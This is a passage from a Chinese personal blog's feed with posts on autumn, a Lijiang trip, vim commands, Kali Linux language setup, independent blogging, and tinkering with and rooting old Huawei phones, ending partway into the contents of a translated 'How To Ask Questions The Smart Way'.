        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>送走了炎炎夏日，迎来了凉爽的秋。</p><p>这是一个风景优美的季节。于这时节，天高云淡，湛蓝的天空，如水洗一般纯净，令人心旷神怡。成片的枫树林，火一般的枫叶用力摆脱了枯枝的束缚，争先恐后地在空中飞舞，如风火轮逆风飞扬；金黄的梧桐叶也悄悄打开了降落伞，飘落在路旁、草丛间，如一双双大手呵护着零星的花朵。闷热的午后，刚刚还晴空万里，转眼乌云密布，毫无征兆的秋雨倾盆而下，畅快邻里，还夹杂着丝丝凉意。</p><p>这是一个收获的季节。稻田波浪起伏，一望无际，像金毯一样铺满大地。一连串长长的稻穗，挂满了粒粒分明且饱满的谷粒。稻杆压弯了腰，随风起舞，恍若跳跃的音符一般。红彤彤的苹果，像婴儿的脸一般红润；黄澄澄的橘子，如灯笼一般明亮；紫红的葡萄，似黑珍珠一般晶莹；还有红宝石一样的石榴，圆圆的柚子，都已经悄悄成熟。一年的汗水与心血，都在这时节得到了丰厚的回报。果园里，菜地里，到处都有人们在忙碌着。</p><p>这是一个团圆的季节。“但愿人长久，千里共婵娟。”忙碌了近一年的人们，都在中秋这一天回到自己温暖的家。一家人团团圆圆，吃月饼，赏圆月。</p><p>秋天的宁静，是夏日轰轰烈烈之后的回归。</p><p>秋天累累的硕果，散发出汗水浇灌之后收获的浓浓喜悦。</p><p>秋天如幸福的中年，经历了幼时的懵懂和少年的意气风发，开启丰沛人生的新起点。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>丽江行记</title>
      <link href="/posts/2342761908/"/>
      <url>/posts/2342761908/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>于中国西南部，有一高原，风光迥然，地处于两省之间者，云贵高原也。向北展望，有山高耸入云，其白洁而层峦叠嶂者，玉龙雪山也。沿山而下，现一古城，其建筑红黑交错而河流相间者，丽江古城也。</p><p>常闻道云南是“云的故乡”，却只在听闻中，未能切身体会。在假期时间，我来到此地，游赏美景，放松心情。到了昆明，刚下飞机，便看到四周高山，顶端云雾缭绕，看不清楚——但这也给云南增添了神秘朦胧的色彩。先前亦有耳闻，云南有丽江古城十分甚至九分出名（雾），“古风浓郁”，自然是要去一睹芳容，便计划前往。</p><p>如果说，北京上海之城市是高楼林立，人们机械地重复着相同的工作；那么，云南的古镇就是小桥流水。人们置身其中，便能净化心灵，放飞自我。单拿上海来作对比，上海随处可见高楼，夜晚灯火通明，大街上车水马龙，十分繁忙，人们的生命里似乎只剩下工作了。云南古镇则基本上都保留了它们古时的样子，原汁原味。丽江古镇就是个典型的例子。这里随处可见的建筑都不高，站在稍微高一点的地方便可将整个古镇尽收眼底。走在窄窄的小巷子里，安静下来，听潺潺的流水声。河上漂浮着几片树叶，更增加了几分情调。街边房屋的门已经有些许褪色，也有些许破旧，但门上雕刻着的花却仍然那么精致美观，古色古香，诉说着千百年的历史。在镇内有许多参天大树，郁郁葱葱。坐在树下，看着湛蓝的天空和绿叶，仿佛仙境一般。下午，坐在茶馆，泡上一杯茶，阳光由窗外照射进来，暖洋洋的。就这么坐着，闭上眼睛，仿佛时间静止了一般，十分惬意。</p><p>夜幕降临，丽江古镇又增添了一种魅力。和大城市的霓虹闪烁不同，这里的灯，在红墙黑瓦的房屋的映衬下，更显得朦胧神秘，冲淡了浮躁的心。人们脸上都洋溢着快乐和微笑，享受着美好生活，有滋有味，如同世外桃源一般。</p><p>丽江古城建造于宋末元初，至今还保留着那时的很多风貌。历史中有很多事件曾经在这里发生，不少名人也曾来到此地。毛泽东曾带领红军历经磨难，渡过金沙江，播撒革命之火；徐霞客曾来到这里实地考察，游多地后著《徐霞客游记》……由此可见其历史悠久，源远流长。</p><p>刚入古城，一股浓郁的古风扑面而来：依山傍水，红墙黑瓦，青色的石板路连接各个房屋，细长的河流穿梭古城之中。彳亍于小道上，看着左右的房舍，仿佛回到宋元明清的繁华；漫步茶马古道边，想象那时互市货运的商队；来到四方街，感受古城中心的热闹与建筑讲究；跨过流水小桥，忽见一座木牌坊赫然，跨进朱红色的木府大门，眼前豁然开朗，如入皇宫……古镇里梦幻般的景象，令人陶醉，也乐趣横生。</p><p>流连于古镇，我想到，如今人们的生活节奏加快，每天大多都是在教室或工作台前忙碌，少有时间外出，自然便会感到疲倦，也就失去了“乐”。然而怎样才能让我们重新找回乐呢？有时候，抽出一点时间，到乡村或古镇走走，享受一下“慢生活”，或哪怕是到屋外转转，乐亦在其中。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vim 编辑器常用命令</title>
      <link href="/posts/2122152757/"/>
      <url>/posts/2122152757/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>$：到行尾</p><p>%s/#.*//g ：删除#之后的字符</p><p>%s/$/sth/ ：在行尾追加 sth</p><p>%s/^M//g ：替换掉 dos 换行符，\^M 使用 ctrl+v + Enter 即可输入</p><p>:g/^\s$/d* ：删除空行以及只有空格的行</p><p>^：到行首第一个字符，如果前面有空格的话</p><p>0：到行首</p><p>cc：替换整行，即删除游标所在行，并进入插入模式</p><p>ce：使本行文本内容居中</p><p>Ctrl+r：redo，即撤销 undo 的操作</p><p>cw：替换一个单词，即删除一个单词，并进入插入模式</p><p>d^：删除至行首</p><p>dd：删除一行</p><p>100dd：删除 100 行</p><p>df&quot;：删除到出现的第一个双引号</p><p>dw：删除一个单词</p><p>G：快速到文件尾</p><p>50G：跳转到第 50 行</p><p>gg：快速到文件头</p><p>h：向左</p><p>j：向下</p><p>20j： 向下移动 20 行</p><p>k：向上</p><p>l：向右</p><p>le：使本行文本内容靠左</p><p>N：查找上一个匹配</p><p>n：查找下一个匹配</p><p>2n：查找下面第二个匹配</p><p>p：粘贴复制或剪切的内容</p><p>5p：将复制或剪切的内容粘贴 5 次</p><p>q!： 不保存，强制退出</p><p>qa!： 有多个文件被打开，同时退出</p><p>R：连续替换，直到按下 Esc</p><p>r+&lt;待替换字母&gt;：将游标所在字母替换为指定字母</p><p>ri：使本行文本内容靠右</p><p>U（大写）：撤销当前行的所有修改</p><p>u{n}：撤销一次或 n 次操作</p><p>wq：保存当前文件并退出</p><p>wqa：保存所有文件并退出</p><p>x：向后剪切一个一个字符，如果是在行尾，则为向前剪切</p><p>5x：剪切 5 个</p><p>xp：非行尾交换两个字符，如从 bs 变成 sb</p><p>y$：复制光标到行尾</p><p>y2fA：复制光标到第二个大写 A 中间的内容</p><p>yfA：复制光标到第一个大写 A 中间的内容</p><p>yw：复制光标开始的一个单词</p><p>yy：复制一行</p><p>5yy：向下复制 5 行</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摘录笔记 </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>研究 Kali Linux 虚拟机</title>
      <link href="/posts/876967294/"/>
      <url>/posts/876967294/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>先前见到网上很多人使用虚拟机，感到新奇，于是着手研究 VMware，虽然一直用着破解的……</p><p>本人对 Kali 早有耳闻，被称为“kali 用得好，局子进的早”。它由 Offensive Security 公司——一家安在全领域知名的、值得信赖的公司开发维护，它甚至还有一些受人尊敬的认证，来对安全从业人员做资格认证。这个系统内置很多安全工具，而且是真的可以用的（你猜为什么有本段开头那句话 w(ﾟДﾟ)w），区别在于使用者。</p><p>使用它应该并不难，毕竟其官网下载类型有很多可选，具体请自行前往 <a href="http://www.kali.org" rel="external nofollow noreferrer">www.kali.org</a> 查看。由于其设计原因，而且本人弄系统不希望直接拿物理机系统“开刀”，自然下载虚拟机版本（预配置的），有对应虚拟机主程序的直接拿来就能用。VMware 版本的默认账户密码均为“kali”，但是登入后在终端可以使用“sudo su”切换为 root 用户。</p><p>启动后第一件事便是设置语言——毕竟还是汉语看着直观。打开终端切换为 root 用户后输入“dpkg-reconfigure locales<br>”，之后使用键盘上下键选择语言，找到“en_US.UTF-8 UTF-8”后按空格取消选择，之后按键盘下键到底找到“zh-CN.UTF-8.UTF-8”按空格选中（GBK 那个也可以选上），然后回车确认后手动重启生效。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>互联网的自留地</title>
      <link href="/posts/3294504097/"/>
      <url>/posts/3294504097/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>（原本的两篇写得过于水，现在已将其合并且加以重制）</p><p><strong>—历程—</strong></p><p>大抵是几年前，本人有写日记的习惯，无论大小事，皆以笔记录。见到些不错的文字，也会记录下来，以备再看。接连下来，对写作十分反感的我，竟在一年内断续写了几十篇……最后，那个本子就“已经记不清是什么时侯失掉了”。</p><p>实在是遗憾！虽然写的净是些拙劣的文字，但看看当时写下极其幼稚的玩意，也未尝不是一种乐趣——虽然有不少文字我再看时有种想把它撕掉的感觉。总之，在那之后我就一直想弄个可以随时看到、记录方便的工具。以当时我的认知与水平，不可能考虑“网站”这种东西。说来那时我对网站的认知极其浅薄，例如后来才知道网站运营者不只有公司，个人也可以。</p><p>信息碎片化时代的到来，静下心写点东西、阅读东西已经可称为“不易”了（虽然我也没好到哪去）。虽有 wx、某博等随时随地表达观点的平台，可惜推送不能尽人意、自定义程度不足、内容限制较多（包括但不限于字数）——但毕竟是偏重社交属性的，这些情况是可以理解的。不过，起码单从作个人经验记录这个目的来看，显得不大方便了。</p><p>让我想想……大约是疫情那段时间，偶然间发现曾经存在度盘里的资源消失了。虽然是些“古早”时期的照片，而且本地也有备份，实在找不来的也只是些无关紧要的内容。不过这个事情动摇了我对公共平台的信任。虽然商业公司对产品作出限制无可厚非，但心中总归还是没底。</p><p>之前接收资料，我会直接转存到云盘中，因为想着随时可看；那次以后，这些东西无论大小与重要程度，我都往本地也丢一份，但这样又牺牲了一定的方便性。既然不放心，那为何不自给自足？就这样，我通过网上的教程，自己摸索着搭建了个一个个人云盘。现在看来，这是一个影响我至今的举动——建一个自己的网站。</p><p>其实那个云盘是通过自己的闲置设备和内网穿透运行的，速度和稳定性差自然是不必说的。但就这样，我对 web 有了一定的认识，而不是停留在“搜索引擎”的使用。也由此，激发了我对软硬件、代码的兴趣。起步是比较困难的，因为没有经验；而“启动”之后，只要自己愿意开始，那么一切都容易被推进，无论成败。就这样，直到现在。</p><p><strong>—用处—</strong></p><p>十多年前，个人博客不可不谓“百花齐放”，更有不少知名博客，直至今日仍在更新。不过大家也都看到了，像网易博客、新浪博客等，关停的关停，没关的可能也说不准。</p><p>想来也是，你看以前网民通过什么平台获取信息？论坛、博客等。而现在的，自然不必多讲。来源广泛，简洁快速，越来越碎片化了。也许正是微博、朋友圈、空间这些平台，论坛、博客逐渐“衰微”，不温不火。前些日子天涯社区关停，根本原因之一恐怕便是这，论坛、博客的时代似乎已经过去了。上个微博、空间或者朋友圈就能知道大事小事，没有太多的废话——这不比天天泡在论坛里来得高效？</p><p>一个事件，一百来字，发在微博，图片视频，迅速传遍大街小巷。在一些社交平台上，你发出来的东西，至少还有一大堆人看得到，随手一个转发，马上就又传到了另一个圈子里——个人博客则难以做到。许多人喜欢刷社交平台，若没有自己喜欢的内容也会去随意看看，或是发表见解。因为他们知道，在这里更有可能快速地获得关注，哪怕只有一两个过客。</p><p>或许正是如此，个人博客与社交平台相比，从某个角度来说，是“孤独”的。试想一下，假设你准备在社交平台上发东西，你发的目的是什么？大多时候总希望是有人来看的。人是社交动物，都喜欢聚在一起凑热闹，什么趣事、难过，往上面发送，便会有人过来回复、闲聊。</p><p>从门槛上来说，社交平台比独立博客方便。会玩手机会上网的，摸索下就能解决社交平台账户问题。独立博客，选择主机、准备域名、研究绑定、学习建站、懂得运维什么的。但是相对与社交平台而言，独立博客显得更为高级。社交平台是大众化的，用户与用户之间大多一个样；独立博客则不然。你尽可以按照自己想象的样子，通过“折腾”让你的想法成为现实。而且，这样做还有一个好处，那就是自己可控的方面更多了。</p><p>与微博的碎片化阅读相比，与微信相对封闭的生态相比，与软件首页推荐的广泛性相比，博客更表现为系统的思考，博客更适应搜索引擎，博客更体现良好的分类。在整个互联网上表现了更大的开放性。纵使我们所处的时代愈发快捷和浮躁，但总会有人想深入看一些东西，博客的优势便体现出来了。细致、系统的思考，绝非一百多字所能容纳的，也绝非随手一滑粗略翻看便能获取的。试想一下，你更愿意记录日常闲谈还是促膝长谈的内容？</p><p>自己搭建博客，整个过程你会非常有成就感，因为这些东西都是用你的双手去创造的。就算没人看你的写的文章，你也不会太过于难过，因为对你而言，这些并不是无用的。你可以用来记录自己想记录的东西，不必过度迎合大众。即使没人理你，你一个人也会玩得开心。</p><p>独立博客和网站是相同性质的东西，只要网站不死，博客怎么会死呢？除非未来科技发展到不需要浏览器、不需要网站了。不过到那时，博客早就“更新换代”去拥抱时代了，也不太可能消亡。</p><p>如果博客只能是是服务他人、追求价值，那么我应该搭建的是知识库，而不是“博客”。而且，一个事物的“价值”也因人而异，哪怕是思考层面上的，若能引起共鸣或其他讨论，那么也是有价值的。因此，你在这里可以看到的并非全部是技术笔记类的文章。纯技术显得“死版”，纯生活容易写成短日记，不妨两相结合。创作者也是人，那讨论和分享的内容变得多元化，便是合理的（太水的我自己也不想看，因为它的价值太低了）。</p><p><strong>—讨论与思考—</strong></p><p>要提到“个人表达”、“观点碰撞”之类的话题，恐怕每个都可以单独编一篇文章出来，而且还很容易讨论到一些容易令人“上火”的东西。因此，在这里我们简要提一下。但相比于所谓“审查严格”、“社会”等等说法，我个人感觉这些还不是重点，最多只能算附带原因。</p><p>现在愿意更新博客，或者说愿意静下心来思考某个观点的人，似乎不常见，即使可见也不是“主流”。不知何时起，网上正常讨论话题的场景愈发不常见。我倒是认为，这是人心浮躁导致的。由于个人站点对站长而言可控性更强，因此也成为了一个很好地表达自我的途径。但它，尤其是的新站点，流量是不高的，也就是说所谓“互动”没那么多。</p><p>当然，也有人会想：</p><blockquote><p>“我写给自己看的东西轮得到别人评论？”</p></blockquote><p>如果真当只是写给自己看，那么建议层层设卡，要么就把评论区关了，或者干脆不要发表。每个人都不可避免存在认知盲区，在观点思考类的文章中更是如此。他人的评价或延续讨论，在此时可以成为作者自我反思的良好依据，甚至能给双方带来更有价值的东西。当然，如果是没有价值的讨论，例如上来就开骂、一捧一踩、恶意广告、已读乱回的，则只会浪费心情和时间。</p><p>如果有发泄性质的文字，还请三思。如果把一个人及其周围的事物想象成一个地块，那么这个地块内总要有个类似“垃圾场”的地方，但请治理好它；如果这个“垃圾场”占据了这个地块的大部分区域，或是污水横流，那么肯定是不受欢迎的，也会污染这个地块的管理者自身（在互联网上偶遇自甘堕落者地块或公共“垃圾场”地块，形态复杂程度强如怪物，拼尽全力也无法战胜，故对此不作过多评价）。</p><p>不过，为了尽量避免一些难以控制的情形，我已经尽量清理了本站中一些容易引发吵架的文字。</p><p><strong>—GPT—</strong></p><p>很显然，在没有 GPT 的时候，我只能凭借搜索引擎去学习去转化；现在有了GPT之后，一些困难的问题都很容易得到解答了。虽然现在有些问题我还是会询问 GPT，但我还是很感谢 GPT 之前的时候，它培养了我搜索和转化的能力。</p><p>就像学习一样，如果是抱着求知的态度，那么学习者一般不会直接拿题目和参考答案学习，而是去教材中学习。基础是教材，而不是习题。我不大相信，拿着习题和答案推出来的知识点能比教材清晰。题目千变万化，而核心知识点却是不变的。拿着教材去研究解题，其中的思考历程远比拿着参考答案来得长，收获也更大。</p><p>同样的，有问题就问 GPT 固然是方便的，但久而久之会让自己失去追求解答的耐心，甚至会被误导——万一这个参考答案错了呢？还是那样，习题千变万化，而知识点却是不变的。如果你使用过 GPT 之类的人工智能工具，你会发现一些复杂的代码需求它很难一次处理好，终究还是要自己去调整的；那么调整的方法何来？还是要自己去学习和转化。</p>]]></content>
      
      
      <categories>
          
          <category> 网站公告 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>测试新编辑器</title>
      <link href="/posts/1334945293/"/>
      <url>/posts/1334945293/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>原来那个编辑器固然轻巧，但功能较少，用着不如 TinyMCE 习惯。天晓得现在这个主题有什么我开发时留下的牛神鬼蛇的 bug，故发此贴测试编辑器。</p>]]></content>
      
      
      <categories>
          
          <category> 网站公告 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>折腾旧手机的经历</title>
      <link href="/posts/2933412209/"/>
      <url>/posts/2933412209/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自二年前无意找到了老旧不用的手机后，吾便将其“珍藏”。一日充电，长按电源键，吾仿佛见到十年前的光景。与如今手机相比，这旧手机的配置不可谓不寒酸。2GB 运存，16GB 储存，稍微好点的 MP3 都能赶上。现在在二手市场去看，不足 100 便可购买到，成色没准比我手头这台还好。</p><p>华为 P6 和 P7、诺基亚 N8 等旧手机几乎是同时被我发现的，充上电好像还能开机，正常使用续航一日多一点，好像还可以。那台诺基亚自然不必说，可惜自发现半年后便不知在什么时候失掉了，实在是遗憾。</p><p>由于联想那台配置实在太低，不满足我的折腾需求，故吾将目光转移到两台旧华为手机身上。两台手机插电均有反应，P6 可以正常开机，还能运行些软件——但无法正常启动的软件占多数，毕竟还在用安卓 4.2 系统的，如今也大多是工控设备或智能柜、无纸化记事本一类的去使用。</p><p>P7 情况比较「悲惨」，外观也是比较破的，后盖玻璃已经破碎部分脱落。对其进行充电，结果提示“手机启动异常”。随后我将其连接电脑并使用工具尝试刷机，却无一例外卡在 fastboot 界面。它提示要我输入解锁码，但我找到并折腾这台手机时，华为官方解锁码通道老早关闭了（心中飘过无数草泥马~）。没办法，线刷双清吧。双清不知道几次后，手机正常开机了！</p><p>满怀激动之心的我打算将其重启——毕竟很久不用的老旧手机，第一次开机难免有未加载好的地方，重启后体验更好——至少重启之前我是这样想的——因为重启后它又不能正常开机了。去网上查阅后，发现那次重启是“回光返照”，因为系统已经有损坏了——但为什么那样还能开机之后不行，吾却未能想通。又折腾几次，终于，它连开机动画都没了Σ( ° △ °|||)︴……</p><p>好吧，虽然 P6 不能插储存卡，虽然 P6 只有 3G，虽然海思 K3V2 性能不好发热量大，却也不是不能用，用来听歌看小说还是可以支撑的。几个月后，它的电池排线断了，在一次折腾中——P6-C00 不像移动和联通版本，它的后盖不是金属拉丝，是磨砂非金属材质，而且是卡扣形式安装的，可以轻松撬开而不需要热风枪。这就尴尬了，被迫使用诺基亚 N8。偶然发现 N8 可玩性不低，而且塞班系统也不多见了，可以折腾，结果不久后弄丢了╥﹏╥…</p><p>由于 aigo 的月光宝盒播放器被我刷系统刷坏了，听歌看书备用机只能用联想 A500 充当了。安卓 2.3 的系统，自己体会一下。好在还是有阅读器可以使用的。断断续续又过了几周，屏幕被我摔碎了……</p><p>我特么欲哭无泪，折腾下来啥也没有了！硬着头皮，找到 P7 并继续折腾——这是我现在手里有的最好的旧手机了，我甚至还破费弄了个新主板和电池给它换上才终于一睹其芳容。</p><p>配合仅能找到的部分当年华为在巴黎开的 AscendP7 发布会，此手机确实名副其实——当然放到现在来看性能肯定是别想了。外观“君子如兰”，屏幕——我去屏幕断触了！等我撬开其屏幕尝试修复时，非但触摸没修好，显示都成问题。好吧，再破费一次，换个屏幕 ( ′ 3`)~</p><p>说回来，有了上回“前车之鉴”，刚测试完正常使用后，我便开始对其进行 root，但暂时不太想刷机。虽然这台手机官方适配都到了安卓 5.1，但怕它的硬件遭不住；而且 EmotionUI2.3 有很多设计，比较，嗯，“复古”，差不多是那种 Apple 带没的东西，而 EMUI3.0（此时才开始改名为“EMUI”）之后就扁平化了。root 只为解 BL 锁，以防万一折腾坏了可以刷机解决。</p><p>按照吾爱破解大佬的方法（末尾链接），研究多时，最终获得解锁码。当然，在此之前也尝试救过砖，可惜原来主板的固件，REC 也被弄坏了，彻底没救。而且是电信定制版的，不支持储存卡，不如换移动主板。总之，这台手机的补救方法已经提前准备好了。</p><p>等哪天把内网穿透之类解决了，可能会准备另一台类似配置的旧手机，然后博客就迁移到手机上运行，用内网穿透解决外网域名访问。免费机速度实在有点迷。</p><p><a href="https://www.52pojie.cn/thread-816065-1-1.html" rel="external nofollow noreferrer">https://www.52pojie.cn/thread-816065-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>How To Ask Questions The Smart Way（提问的智慧）</title>
      <link href="/posts/3303390089/"/>
      <url>/posts/3303390089/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="提问的智慧">提问的智慧</h2><p><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/pulls" rel="external nofollow noreferrer"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square" alt="PRs Welcome"></a></p><p><strong>How To Ask Questions The Smart Way</strong></p><p>Copyright © 2001,2006,2014 Eric S. Raymond, Rick Moen</p><p>本指南英文版版权为 Eric S. Raymond, Rick Moen 所有。</p><p>原文网址：<a href="http://www.catb.org/~esr/faqs/smart-questions.html" rel="external nofollow noreferrer">http://www.catb.org/~esr/faqs/smart-questions.html</a></p><p>Copyleft 2001 by D.H.Grand(nOBODY/Ginux), 2010 by Gasolin, 2015 by Ryan Wu</p><p>本中文指南是基于原文 3.10 版以及 2010 年由 <a href="https://github.com/gasolin" rel="external nofollow noreferrer">Gasolin</a> 所翻译版本的最新翻译；</p><p>协助指出翻译问题，<strong>请 <a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/issues/new" rel="external nofollow noreferrer">发 issue</a>，或直接 <a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/compare" rel="external nofollow noreferrer">发 pull request</a> 给我。</strong></p><p>本文另有 <a href="README.md">繁體中文版</a>。</p><h2 id="原文版本历史"><a href="history.md">原文版本历史</a></h2><h2 id="目录">目录</h2><ul><li><a href="#%E6%8F%90%E9%97%AE%E7%9A%84%E6%99%BA%E6%85%A7">提问的智慧</a><ul><li><a href="#%E5%8E%9F%E6%96%87%E7%89%88%E6%9C%AC%E5%8E%86%E5%8F%B2">原文版本历史</a></li><li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li><li><a href="#%E5%A3%B0%E6%98%8E">声明</a></li><li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li><li><a href="#%E5%9C%A8%E6%8F%90%E9%97%AE%E4%B9%8B%E5%89%8D">在提问之前</a></li><li><a href="#%E5%BD%93%E4%BD%A0%E6%8F%90%E9%97%AE%E6%97%B6">当你提问时</a><ul><li><a href="#%E6%85%8E%E9%80%89%E6%8F%90%E9%97%AE%E7%9A%84%E8%AE%BA%E5%9D%9B">慎选提问的论坛</a></li><li><a href="#stack-overflow">Stack Overflow</a></li><li><a href="#%E7%BD%91%E7%AB%99%E5%92%8C-irc-%E8%AE%BA%E5%9D%9B">网站和 IRC 论坛</a></li><li><a href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%E4%BD%BF%E7%94%A8%E9%A1%B9%E7%9B%AE%E9%82%AE%E4%BB%B6%E5%88%97%E8%A1%A8">第二步，使用项目邮件列表</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E6%9C%89%E6%84%8F%E4%B9%89%E4%B8%94%E6%8F%8F%E8%BF%B0%E6%98%8E%E7%A1%AE%E7%9A%84%E6%A0%87%E9%A2%98">使用有意义且描述明确的标题</a></li><li><a href="#%E4%BD%BF%E9%97%AE%E9%A2%98%E5%AE%B9%E6%98%93%E5%9B%9E%E5%A4%8D">使问题容易回复</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E6%B8%85%E6%99%B0%E6%AD%A3%E7%A1%AE%E7%B2%BE%E5%87%86%E4%B8%94%E5%90%88%E4%B9%8E%E8%AF%AD%E6%B3%95%E7%9A%84%E8%AF%AD%E5%8F%A5">使用清晰、正确、精准且合乎语法的语句</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E6%98%93%E4%BA%8E%E8%AF%BB%E5%8F%96%E4%B8%94%E6%A0%87%E5%87%86%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%8F%91%E9%80%81%E9%97%AE%E9%A2%98">使用易于读取且标准的文件格式发送问题</a></li><li><a href="#%E7%B2%BE%E7%A1%AE%E5%9C%B0%E6%8F%8F%E8%BF%B0%E9%97%AE%E9%A2%98%E5%B9%B6%E8%A8%80%E4%B9%8B%E6%9C%89%E7%89%A9">精确地描述问题并言之有物</a></li><li><a href="#%E8%AF%9D%E4%B8%8D%E5%9C%A8%E5%A4%9A%E8%80%8C%E5%9C%A8%E7%B2%BE">话不在多而在精</a></li><li><a href="#%E5%88%AB%E5%8A%A8%E8%BE%84%E5%A3%B0%E7%A7%B0%E6%89%BE%E5%88%B0-bug">别动辄声称找到 Bug</a></li><li><a href="#%E4%BD%8E%E5%A3%B0%E4%B8%8B%E6%B0%94%E4%B8%8D%E8%83%BD%E4%BB%A3%E6%9B%BF%E4%BD%A0%E7%9A%84%E5%8A%9F%E8%AF%BE">低声下气不能代替你的功课</a></li><li><a href="#%E6%8F%8F%E8%BF%B0%E9%97%AE%E9%A2%98%E7%97%87%E7%8A%B6%E8%80%8C%E9%9D%9E%E4%BD%A0%E7%9A%84%E7%8C%9C%E6%B5%8B">描述问题症状而非你的猜测</a></li><li><a href="#%E6%8C%89%E5%8F%91%E7%94%9F%E6%97%B6%E9%97%B4%E5%85%88%E5%90%8E%E5%88%97%E5%87%BA%E9%97%AE%E9%A2%98%E7%97%87%E7%8A%B6">按发生时间先后列出问题症状</a></li><li><a href="#%E6%8F%8F%E8%BF%B0%E7%9B%AE%E6%A0%87%E8%80%8C%E4%B8%8D%E6%98%AF%E8%BF%87%E7%A8%8B">描述目标而不是过程</a></li><li><a href="#%E5%88%AB%E8%A6%81%E6%B1%82%E4%BD%BF%E7%94%A8%E7%A7%81%E4%BA%BA%E7%94%B5%E9%82%AE%E5%9B%9E%E5%A4%8D">别要求使用私人电邮回复</a></li><li><a href="#%E6%B8%85%E6%A5%9A%E6%98%8E%E7%A1%AE%E5%9C%B0%E8%A1%A8%E8%BE%BE%E4%BD%A0%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%A5%E5%8F%8A%E9%9C%80%E6%B1%82">清楚明确地表达你的问题以及需求</a></li><li><a href="#%E8%AF%A2%E9%97%AE%E6%9C%89%E5%85%B3%E4%BB%A3%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98%E6%97%B6">询问有关代码的问题时</a></li><li><a href="#%E5%88%AB%E6%8A%8A%E8%87%AA%E5%B7%B1%E5%AE%B6%E5%BA%AD%E4%BD%9C%E4%B8%9A%E7%9A%84%E9%97%AE%E9%A2%98%E8%B4%B4%E4%B8%8A%E6%9D%A5">别把自己家庭作业的问题贴上来</a></li><li><a href="#%E5%8E%BB%E6%8E%89%E6%97%A0%E6%84%8F%E4%B9%89%E7%9A%84%E6%8F%90%E9%97%AE%E5%8F%A5">去掉无意义的提问句</a></li><li><a href="#%E5%8D%B3%E4%BD%BF%E4%BD%A0%E5%BE%88%E6%80%A5%E4%B9%9F%E4%B8%8D%E8%A6%81%E5%9C%A8%E6%A0%87%E9%A2%98%E5%86%99%E7%B4%A7%E6%80%A5">即使你很急也不要在标题写<code>紧急</code></a></li><li><a href="#%E7%A4%BC%E5%A4%9A%E4%BA%BA%E4%B8%8D%E6%80%AA%E8%80%8C%E4%B8%94%E6%9C%89%E6%97%B6%E8%BF%98%E5%BE%88%E6%9C%89%E5%B8%AE%E5%8A%A9">礼多人不怪，而且有时还很有帮助</a></li><li><a href="#%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%90%8E%E5%8A%A0%E4%B8%AA%E7%AE%80%E7%9F%AD%E7%9A%84%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E">问题解决后，加个简短的补充说明</a></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E8%A7%A3%E8%AF%BB%E7%AD%94%E6%A1%88">如何解读答案</a><ul><li><a href="#rtfm-%E5%92%8C-stfw%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E4%BD%A0%E5%B7%B2%E5%AE%8C%E5%85%A8%E6%90%9E%E7%A0%B8%E4%BA%86">RTFM 和 STFW：如何知道你已完全搞砸了</a></li><li><a 